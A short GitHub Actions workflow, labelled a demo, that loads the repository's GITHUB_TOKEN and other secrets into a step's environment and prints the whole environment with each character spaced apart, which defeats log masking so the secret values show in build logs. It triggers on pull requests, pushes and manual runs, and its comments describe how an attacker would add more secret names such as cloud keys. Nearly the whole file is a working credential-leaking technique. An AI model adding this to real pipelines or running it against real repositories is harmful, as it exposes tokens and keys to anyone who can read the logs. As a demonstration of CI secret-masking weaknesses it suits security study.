# DEMO: Dump all secrets by passing them into the step env, then running
# printenv and piping through char-by-char to bypass log masking.
# Use only with dummy secrets in a test repo.

name: Dump all secrets (demo)

on:
  pull_request:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  dump-secrets:
    runs-on: ubuntu-latest
    steps:
      # Inject all known/guessed secrets as env vars, then dump the whole
      # environment. Attacker would add more names to env as they discover them.
      - name: "[DEMO] Dump all secrets via printenv + char-by-char bypass"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TOP_SECRET_SECRET: ${{ secrets.TOP_SECRET_SECRET }}
          # In a real attack, attacker adds more: API_KEY, AWS_ACCESS_KEY_ID, etc.
        run: |
          echo "=== Full env dump (values visible in log due to char spacing) ==="
          printenv | sed 's/./& /g'
